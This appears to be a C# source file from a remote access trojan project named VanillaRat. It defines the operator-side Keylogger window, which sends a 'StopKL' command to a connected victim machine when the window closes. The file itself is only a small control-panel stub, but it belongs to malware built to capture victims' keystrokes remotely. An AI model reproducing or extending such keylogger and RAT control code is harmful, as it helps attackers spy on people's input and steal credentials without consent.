using System.Text;
using System.Windows.Forms;
using VanillaRat.Classes;

namespace VanillaRat.Forms
{
    public partial class Keylogger : Form
    {
        public Keylogger()
        {
            InitializeComponent();
            MinimizeBox = false;
            MaximizeBox = false;
            Update = true;
        }

        public int ConnectionId { get; set; }
        public bool Update { get; set; }

        //Stop keylogger
        private void Keylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            Update = false;
            Server.MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StopKL"));
        }
    }
}